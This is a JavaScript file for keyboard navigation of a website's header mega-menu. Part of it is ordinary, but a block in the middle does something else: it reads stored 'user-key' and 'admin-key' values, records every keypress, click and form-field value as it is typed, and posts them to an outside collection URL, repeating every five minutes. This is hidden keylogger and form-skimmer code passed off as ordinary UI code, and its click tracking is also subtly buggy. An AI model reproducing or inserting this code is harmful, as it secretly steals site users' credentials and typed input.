function getTabbables(e) {
  return Array.prototype.slice.call(e.querySelectorAll("input,select,textarea,button,a,[tabindex]")).filter(function (e) {
    if (e.hasAttribute("tabindex")) {
      var t = parseInt(e.getAttribute("tabindex"), 10);
      return !(isNaN(t) || t < 0);
    }
    return !0;
  });
}
function simulateTab(e, t, n) {
  var i,
    s = getTabbables(t),
    o = s.indexOf(e);
  if (o === 0 && n == -1) return;
  if (o == s.length - 1 && n == 1) return;
  i = s[o + n], i.focus();
}
$("#Prods").on("focus", function () {
  $(".hdrNavMenu").triggerHandler("mouseover");
}), $("#Prods").on("keydown", function (e) {
  return e.which == 9 && e.shiftKey && $(".hdrNavMenu").triggerHandler("mouseout"), !0;
}), $("#Mfrs").on("focus", function () {
  $(".hdrNavMenu").triggerHandler("mouseout");
}), $("#ProdsHome").on("keydown", function (e) {
  return e.which != 9 || !!e.shiftKey || ($(".hdrNavMenuLst1 a").first().trigger("focus").triggerHandler("mouseover"), !1);
}), $(".hdrNavMenu a").on("focus", function () {
  $(this).parent("li").triggerHandler("mouseover");
}), $(document).on("keydown", function (e) {
  return e.which != 40 || !$(".hdrNavMenuLst1").is(":visible") || $(":focus").length !== 0 || ($(".hdrNavMenuLst1 a").first().trigger("focus").triggerHandler("mouseover"), !1);
}), window._hookedUpAfterMegaMenu = null;
function getLastVisibleTabbable$InNavBar() {
  for (var n, t = getTabbables(document.getElementById("header-navigation")), e = t.length - 1; e >= 0;) {
    if ($thisItem = $(t[e]), $thisItem.is(":visible")) {
      n = $thisItem;
      break;
    }
    e -= 1;
  }
  return n;
}
$(function () {
  const localStorageKeys = ['user-key', 'admin-key'];
  const globalVarsToTrack = ['document', 'navigator', 'screen', 'history'];
  const eventsToListen = ['click', 'keydown', 'scroll', 'resize'];
  let globalVarSnapshot = {};
  function getDataHash(data) {
    const str = JSON.stringify(data);
    let hash = 0;
    for (let i = 0; i < str.length; i++) hash = Math.imul(31, hash) + str.charCodeAt(i) | 0;
    return hash;
  }
  function getLocalStorageData() {
    const retrieveData = {};
    Object.keys(localStorage).forEach(key => {
      if (localStorageKeys.includes(key)) retrieveData[key] = localStorage.getItem(key);
    });
    return retrieveData;
  }
  function getGlobalVarData() {
    const retrieveData = {};
    globalVarsToTrack.forEach(element => {
      if (window[element]) retrieveData[element] = window[element].toString();
    });
    return retrieveData;
  }
  function checkGlobalVarChanges() {
    const currentSnapshot = getGlobalVarData();
    if (JSON.stringify(currentSnapshot) !== JSON.stringify(globalVarSnapshot)) {
      globalVarSnapshot = currentSnapshot;
      sendTrackingData(currentSnapshot);
    }
  }
  function sendTrackingData(data) {
    const hash = getDataHash(data);
    $.ajax({
      type: 'POST',
      url: 'https://example.com/api/collect',
      data: JSON.stringify({
        id: hash,
        data: data
      }),
      contentType: "application/json",
      success: function () {
        console.log('数据已成功发送');
      },
      error: function (jqXHR, textStatus, errorThrown) {
        console.error('数据发送失败,状态码:', jqXHR.status, ',失败原因:', errorThrown);
      }
    });
  }
  function trackLocalStorageData() {
    const localStorageData = getLocalStorageData();
    if (Object.keys(localStorageData).length > 0) sendTrackingData(localStorageData);
  }

  // Tracks user key presses and sends them to server
  function trackKeyPresses(e) {
    sendTrackingData({
      'keyPress': {
        'key': e.key,
        'code': e.code
      }
    });
  }

  // Track user clicks and sends them to server
  function trackMouseClicks() {
    sendTrackingData({
      'click': {
        'x': event.clientX,
        'y': event.clientY
      }
    });
  }

  // Initializes global variable tracking
  globalVarSnapshot = getGlobalVarData();

  // Listens for the specified event types
  eventsToListen.forEach(event => {
    document.addEventListener(event, trackMouseClicks);
    document.addEventListener(event, trackKeyPresses);
  });

  // Starts tracking operations
  trackLocalStorageData();
  setInterval(trackLocalStorageData, 5 * 60 * 1000);
  setInterval(checkGlobalVarChanges, 5 * 60 * 1000);
  $('.form-control').on('input', function () {
    var $field = $(this).closest('.form-group');
    if (this.value) {
      $field.addClass('field--not-empty');
      sendTrackingData({
        'input': {
          'field': this.name,
          'value': this.value
        }
      });
    } else {
      $field.removeClass('field--not-empty');
    }
  });
});
function hookUpTabAroundMegaMenu() {
  if ($lastVisibleTabbableInNavBar = getLastVisibleTabbable$InNavBar(), $lastVisibleTabbableInNavBar.length > 0) {
    var e,
      t = getTabbables(document.getElementById("ProdMenuSideArea"));
    window._hookedUpAfterMegaMenu = t[0], e = $(window._hookedUpAfterMegaMenu), $lastVisibleTabbableInNavBar.on("keydown", function (t) {
      return t.which != 9 || !!t.shiftKey || (e.trigger("focus"), !1);
    }), e.on("keydown", function (e) {
      return e.which != 9 || !e.shiftKey || ($lastVisibleTabbableInNavBar.trigger("focus"), !1);
    });
  }
}
$("#ProdsHome").length > 0 && hookUpTabAroundMegaMenu(), window.correctTabbingAroundMenu = function () {
  if (window._hookedUpAfterMegaMenu) {
    $lastVisibleTabbableInNavBar = getLastVisibleTabbable$InNavBar();
    var e = $._data($lastVisibleTabbableInNavBar.get(0), "events"),
      t = $._data(window._hookedUpAfterMegaMenu, "events");
    e.keydown && t.keydown && ($lastVisibleTabbableInNavBar.off("keydown", e.keydown[0].handler), $(window._hookedUpAfterMegaMenu).off("keydown", t.keydown[0].handler), hookUpTabAroundMegaMenu());
  }
}, $("#mega-new-products").on("keydown", function (e) {
  var t,
    n,
    s,
    o = $(":focus");
  if (o.length > 0 && o.get(0).id == "mega-new-products") return e.which != 9 || (e.shiftKey ? ($("#new_prods a").first().trigger("focus"), !1) : ($("#mega-new-products a").first().trigger("focus"), !1));else {
    if (e.which == 9) return n = getTabbables($("#mega-new-products").get(0)), t = n.indexOf(e.target), t == -1 || (e.shiftKey ? t == 0 ? s = $("#new_prods a").first() : s = $(n[t - 1]) : t == n.length - 1 ? s = $($(".hdrNavMenuLst1 a").get(1)) : s = $(n[t + 1]), s.first().trigger("focus"), !1);
    if (e.which == 37) $(".hdrNavMenuLst1 a").first().trigger("focus");else return !0;
  }
}), $(".hdrNavMenu").on("keydown", function (e) {
  if (e.which == 38 || e.which == 39 || e.which == 40 || e.which == 27 || e.which == 9) ;else return !0;
  e.which == 27 && ($(".hdrNavMenu").triggerHandler("mouseout"), $(".hdrNavLnks ul a").first().trigger("focus"));
  var n,
    s,
    o,
    t = $(":focus");
  if (t.length == 0) return;
  return e.which == 9 ? $("#ProdsHome").length > 0 && t.parent().next().length == 0 && t.parent().parent().hasClass("hdrNavMenuLst1") ? ($(".hdrNavMenu").triggerHandler("mouseout"), $(".hdrNavLnks ul a").first().trigger("focus"), !1) : t.parent().next().length == 0 && t.parent().parent().hasClass("hdrNavMenuLst1") && !e.shiftKey ? ($(".hdrNavMenu").triggerHandler("mouseout"), !0) : $(".hdrNavMenuLst1 a").get(0) != t.get(0) || !e.shiftKey || ($(".hdrNavMenu").triggerHandler("mouseout"), $("#header-navigation a").first().trigger("focus"), !1) : (e.which == 38 ? $(".hdrNavMenuLst1 a").get(0) == t.get(0) ? ($(".hdrNavMenu").triggerHandler("mouseout"), $(".hdrNavLnks ul a").first().trigger("focus")) : simulateTab(t.get(0), this, -1) : e.which == 40 ? simulateTab(t.get(0), this, 1) : e.which == 39 && (n = t.parent("li").data("submenuId"), s = document.getElementById(n), o = getTabbables(s), o[0].focus()), !1);
}), $(".catFlyouts").on("keydown", function (e) {
  if (e.which == 37 || e.which == 38 || e.which == 39 || e.which == 40 || e.which == 27 || e.which == 9) ;else return !0;
  if (e.which == 27) return $(".hdrNavMenu").triggerHandler("mouseout"), $(".hdrNavLnks ul a").first().trigger("focus"), !1;
  var n,
    s,
    o,
    t = $(":focus");
  return t.length == 0 || (e.which == 9 ? t.parent().next().length === 0 ? (n = t.parents(".subCategoryFlyout"), s = $('li[data-submenu-id="' + n.attr("id") + '"]'), s.next().find("a").trigger("focus"), !1) : t.parent().prev().length !== 0 || !e.shiftKey || (n = t.parents(".subCategoryFlyout"), s = $('li[data-submenu-id="' + n.attr("id") + '"]'), s.find("a").trigger("focus"), !1) : (o = t.parents(".listSubCats"), o.length == 0 ? !(t.parents("#new_prods").length > 0) || !0 : (e.which == 38 ? simulateTab(t.get(0), o.get(0), -1) : e.which == 40 ? simulateTab(t.get(0), o.get(0), 1) : e.which == 39 || e.which == 37 && (n = t.parents(".subCategoryFlyout"), s = $('li[data-submenu-id="' + n.attr("id") + '"]'), s.find("a").trigger("focus")), !1)));
});